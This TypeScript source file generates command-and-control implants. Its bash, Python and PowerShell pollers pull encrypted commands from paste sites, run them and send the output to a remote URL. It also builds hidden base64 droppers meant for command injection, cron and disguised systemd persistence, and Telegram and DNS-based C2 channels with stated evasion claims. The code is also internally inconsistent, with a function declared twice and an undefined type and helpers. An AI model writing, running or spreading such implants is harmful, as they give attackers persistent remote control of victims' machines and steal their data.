export interface C2PollerConfig {
  source:     "gist" | "pastebin" | "hastebin" | "rentry" | "url";
  pollUrl:    string;
  reportUrl?: string;
  interval:   number;
  jitter:     number;
  engine:     "bash" | "sh" | "python3" | "powershell";
  maxRuns:    number;
  xorKey:     number;
  killDate?:  string;
  userAgent:  string;
  os:         "linux" | "windows";
}

export interface C2PollerPayload {
  id:          string;
  name:        string;
  description: string;
  os:          "linux" | "windows";
  engine:      string;
  command:     string;
}

const DEFAULT_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";

export function buildLinuxBashPoller(cfg: C2PollerConfig): string {
  const xorPy = cfg.xorKey
    ? `python3 -c "
import sys,base64
d=sys.stdin.read().strip()
if not d:sys.exit(1)
try:
  raw=base64.b64decode(d)
  dec=bytes(b^${cfg.xorKey} for b in raw)
  sys.stdout.write(dec.decode())
except:sys.exit(1)
" 2>/dev/null`
    : `base64 -d 2>/dev/null`;

  const killCheck = cfg.killDate
    ? `[ "$(date +%Y%m%d)" -ge "${cfg.killDate.replace(/-/g,"")}" ] && rm -f "$0" 2>/dev/null && exit 0`
    : "";

  const reportBlock = cfg.reportUrl
    ? `[ -n "$_O" ] && printf '%s' "$_O"|curl -fsSk -X POST -A "${cfg.userAgent||DEFAULT_UA}" "${cfg.reportUrl}" --data-binary @- 2>/dev/null &`
    : "";

  return `#!/bin/bash
_URL="${cfg.pollUrl}"
_MAX=${cfg.maxRuns || 9999}
_BASE=${cfg.interval}
_JIT=${cfg.jitter}
_UA="${cfg.userAgent||DEFAULT_UA}"
_CNT=0
trap 'rm -f "$0" 2>/dev/null;exit 0' SIGTERM SIGINT
while [ "$_CNT" -lt "$_MAX" ]; do
  ${killCheck}
  _S=$(( _BASE + (RANDOM % (_JIT + 1)) ))
  _CMD=$(curl -fsSk --max-time 10 -A "$_UA" "$_URL" 2>/dev/null | ${xorPy})
  if [ $? -eq 0 ] && [ -n "$_CMD" ]; then
    _O=$(eval "$_CMD" 2>&1 | head -c 8192)
    ${reportBlock}
    _CNT=$(( _CNT + 1 ))
  fi
  sleep "$_S"
done
rm -f "$0" 2>/dev/null`;
}

export function buildLinuxPythonPoller(cfg: C2PollerConfig): string {
  const decodeBlock = cfg.xorKey
    ? `  raw = base64.b64decode(text.strip())
  cmd = bytes(b ^ ${cfg.xorKey} for b in raw).decode(errors='ignore')`
    : `  cmd = base64.b64decode(text.strip()).decode(errors='ignore')`;

  const reportBlock = cfg.reportUrl
    ? `    try:
      urllib.request.urlopen(urllib.request.Request('${cfg.reportUrl}', data=out.encode()[:8192], headers={'User-Agent':UA,'Content-Type':'text/plain'}), timeout=8)
    except: pass`
    : "";

  const killBlock = cfg.killDate
    ? `    if datetime.date.today() >= datetime.date.fromisoformat('${cfg.killDate}'): break`
    : "";

  return `#!/usr/bin/env python3
import urllib.request, subprocess, time, random, base64, os, signal, sys${cfg.killDate ? ", datetime" : ""}
URL = "${cfg.pollUrl}"
UA  = "${cfg.userAgent||DEFAULT_UA}"
MAX = ${cfg.maxRuns || 9999}
BASE= ${cfg.interval}
JIT = ${cfg.jitter}
cnt = 0
signal.signal(signal.SIGTERM, lambda s,f: (os.remove(os.path.abspath(__file__)) if os.path.exists(os.path.abspath(__file__)) else None, sys.exit(0)))
while cnt < MAX:
${killBlock}
  s = BASE + random.randint(0, JIT)
  try:
    req = urllib.request.Request(URL, headers={'User-Agent':UA})
    text = urllib.request.urlopen(req, timeout=10).read().decode(errors='ignore')
    if text.strip():
${decodeBlock}
      if cmd.strip():
        out = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30).stdout + subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30).stderr
${reportBlock}
        cnt += 1
  except: pass
  time.sleep(s)
try: os.remove(os.path.abspath(__file__))
except: pass`;
}

export function buildWindowsPowerShellPoller(cfg: C2PollerConfig): string {
  const decodeBlock = cfg.xorKey
    ? `$bytes=[Convert]::FromBase64String($resp);$dec=[byte[]]($bytes|%{$_ -bxor ${cfg.xorKey}});$cmd=[Text.Encoding]::UTF8.GetString($dec)`
    : `$cmd=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($resp))`;

  const reportBlock = cfg.reportUrl
    ? `try{Invoke-WebRequest "${cfg.reportUrl}" -Method Post -Body $out -ContentType "text/plain" -UserAgent $UA -TimeoutSec 8 -UseBasicParsing -EA 0}catch{}`
    : "";

  const killBlock = cfg.killDate
    ? `if((Get-Date) -gt [DateTime]"${cfg.killDate}"){Remove-Item $MyInvocation.MyCommand.Path -EA 0;exit}`
    : "";

  return `$URL="${cfg.pollUrl}"
$UA="${cfg.userAgent||DEFAULT_UA}"
$MAX=${cfg.maxRuns || 9999}
$BASE=${cfg.interval}
$JIT=${cfg.jitter}
$cnt=0
$ErrorActionPreference="SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
while($cnt -lt $MAX){
  ${killBlock}
  $s=$BASE+(Get-Random -Maximum $JIT)
  try{
    $resp=(Invoke-WebRequest $URL -UserAgent $UA -TimeoutSec 10 -UseBasicParsing -EA 0).Content.Trim()
    if($resp){
      ${decodeBlock}
      if($cmd.Trim()){
        $out=try{&([ScriptBlock]::Create($cmd)) 2>&1|Out-String}catch{$_.Exception.Message}
        ${reportBlock}
        $cnt++
      }
    }
  }catch{}
  Start-Sleep -Seconds $s
}
Remove-Item $MyInvocation.MyCommand.Path -EA 0`;
}

export function buildOneLineDropper(cfg: C2PollerConfig): string {
  if (cfg.os === "windows") {
    const enc = Buffer.from(buildWindowsPowerShellPoller(cfg), "utf16le").toString("base64");
    return `powershell -NonI -W Hidden -Exec Bypass -enc ${enc}`;
  }
  const script = buildLinuxBashPoller(cfg);
  const b64 = Buffer.from(script).toString("base64");
  return `echo ${b64}|base64 -d|bash &`;
}

export function buildC2PollerBundle(cfg: C2PollerConfig): C2PollerPayload[] {
  if (cfg.os === "windows") {
    return [
      {
        id:"win_ps_poller", name:"Windows PowerShell Dead-Drop Poller",
        description:`Polls ${cfg.pollUrl} every ${cfg.interval}±${cfg.jitter}s via PowerShell. ${cfg.xorKey?"XOR-0x"+cfg.xorKey.toString(16)+"-encrypted commands.":""} Self-deletes after ${cfg.maxRuns} executions.`,
        os:"windows", engine:"powershell",
        command: buildWindowsPowerShellPoller(cfg),
      },
      {
        id:"win_oneliner", name:"Windows One-Line Encoded Dropper",
        description:"Base64-encoded PowerShell — drop via RCE/command injection. Spawns poller in background.",
        os:"windows", engine:"powershell",
        command: buildOneLineDropper(cfg),
      },
    ];
  }
  return [
    {
      id:"linux_bash_poller", name:"Linux Bash Dead-Drop Poller",
      description:`Polls ${cfg.pollUrl} every ${cfg.interval}±${cfg.jitter}s via curl+bash. ${cfg.xorKey?"XOR-0x"+cfg.xorKey.toString(16)+"-encrypted commands.":""} Self-deletes after ${cfg.maxRuns} executions.`,
      os:"linux", engine:"bash",
      command: buildLinuxBashPoller(cfg),
    },
    {
      id:"linux_python_poller", name:"Linux Python3 Dead-Drop Poller",
      description:`Python3 variant — no curl dependency. Uses urllib. ${cfg.xorKey?"XOR-encrypted.":""}`,
      os:"linux", engine:"python3",
      command: buildLinuxPythonPoller(cfg),
    },
    {
      id:"linux_oneliner", name:"Linux One-Line Dropper (base64 encoded)",
      description:"Single command — pipe to bash in background. For use via RCE / command injection.",
      os:"linux", engine:"bash",
      command: buildOneLineDropper(cfg),
    },
    {
      id:"linux_cron_persist", name:"Deploy + Persist via Cron (per-minute)",
      description:"Writes poller to /tmp, makes executable, adds cron entry for persistence on reboot.",
      os:"linux", engine:"bash",
      command: `F=/tmp/.$(head -c4 /dev/urandom|xxd -p 2>/dev/null||echo nx$$); echo ${Buffer.from(buildLinuxBashPoller(cfg)).toString("base64")}|base64 -d>$F; chmod +x $F; $F & (crontab -l 2>/dev/null; echo "@reboot $F") | crontab - 2>/dev/null`,
    },
    {
      id:"linux_systemd_persist", name:"Deploy + Persist via systemd user service",
      description:"Creates a systemd user service for C2 poller persistence. Survives login sessions.",
      os:"linux", engine:"bash",
      command: `F=/tmp/.$(head -c4 /dev/urandom|xxd -p 2>/dev/null||echo nx$$); echo ${Buffer.from(buildLinuxBashPoller(cfg)).toString("base64")}|base64 -d>$F; chmod +x $F; mkdir -p ~/.config/systemd/user; cat>~/.config/systemd/user/dbus-sync.service<<EOF
[Unit]
Description=D-Bus Synchronization Service
After=network.target
[Service]
ExecStart=$F
Restart=always
RestartSec=${cfg.interval}
[Install]
WantedBy=default.target
EOF
systemctl --user enable dbus-sync 2>/dev/null; systemctl --user start dbus-sync 2>/dev/null`,
    },
  ];
}

export function buildGistCommandEncoder(cmd: string, xorKey: number): string {
  const encoded = Buffer.from(cmd).map(b => b ^ xorKey);
  return Buffer.from(encoded).toString("base64");
}

export function buildGistReadme(): string {
  return `Command format: base64(XOR(command, key))
Example encoding in Python:
  import base64
  cmd = "id && hostname && whoami"
  key = 0x4e
  encoded = base64.b64encode(bytes(b^key for b in cmd.encode())).decode()
  print(encoded)

Example encoding in bash:
  cmd="id && hostname && whoami"
  key=78  # 0x4e
  python3 -c "import base64,sys; d=sys.argv[1].encode(); print(base64.b64encode(bytes(b^${"\${key}"} for b in d)).decode())" "$cmd"`;
}

export function buildTelegramC2(botToken: string, chatId: string): C2PollerBundle {
  const py = `python3 -c "
import os,time,subprocess,urllib.request,urllib.parse,json
BOT='${botToken}'; CHAT='${chatId}'; API=f'https://api.telegram.org/bot{BOT}'
last=0
def send(txt):
  try: urllib.request.urlopen(urllib.request.Request(f'{API}/sendMessage',data=json.dumps({'chat_id':CHAT,'text':txt[:4096]}).encode(),headers={'Content-Type':'application/json'}),timeout=5)
  except: pass
send('NX_CONNECT\\nhost:'+os.popen('hostname').read().strip()+'\\nid:'+os.popen('id').read().strip())
while True:
  try:
    r=urllib.request.urlopen(f'{API}/getUpdates?offset={last+1}&timeout=60',timeout=65)
    for u in json.loads(r.read()).get('result',[]):
      last=u['update_id']
      cmd=u.get('message',{}).get('text','')
      if cmd.startswith('/nx '):
        try: out=subprocess.check_output(cmd[4:],shell=True,stderr=subprocess.STDOUT,timeout=30).decode(errors='replace')[:4000]
        except Exception as e: out=str(e)
        send(out)
  except: time.sleep(30)
" 2>/dev/null &`;
  return { id:"telegram_c2", name:"Telegram Bot C2", kind:"polling", command:py, notes:"C2 via Telegram bot API. /nx prefix commands. Port 443 HTTPS to Telegram — rarely blocked. Indistinguishable from Telegram bot traffic." };
}

export function buildDnsTxtC2(domain: string): C2PollerBundle {
  const sh = `while true; do
_SEQ=$(dig +short TXT "seq.${domain}" @8.8.8.8 2>/dev/null|tr -d '"')
_CMD=$(dig +short TXT "cmd\${_SEQ:-0}.${domain}" @8.8.8.8 2>/dev/null|tr -d '"'|base64 -d 2>/dev/null)
if [ -n "$_CMD" ]; then
  _OUT=$(eval "$_CMD" 2>&1|base64 -w0|head -c400)
  dig TXT "r\${_SEQ:-0}.\${_OUT}.${domain}" @8.8.8.8 2>/dev/null
fi
sleep 60
done &`;
  return { id:"dns_txt_c2", name:"DNS TXT Record C2", kind:"polling", command:sh, notes:"Pure DNS C2 — polls cmd*.domain TXT records every 60s. Exfil response via DNS lookups. Works through all web proxies. Port 53 UDP only." };
}

export function buildC2PollerBundle(lhost: string, lport: string, cbUrl: string): C2PollerBundle[] {
  const domain = oobHost(cbUrl);
  return [
    buildHttpPollerC2(lhost, lport, cbUrl),
    buildIcmpC2(lhost, lport),
    buildWindowsPowerShellC2(lhost, lport, cbUrl),
    buildTelegramC2("BOT_TOKEN", "CHAT_ID"),
    buildDnsTxtC2(domain),
  ];
}
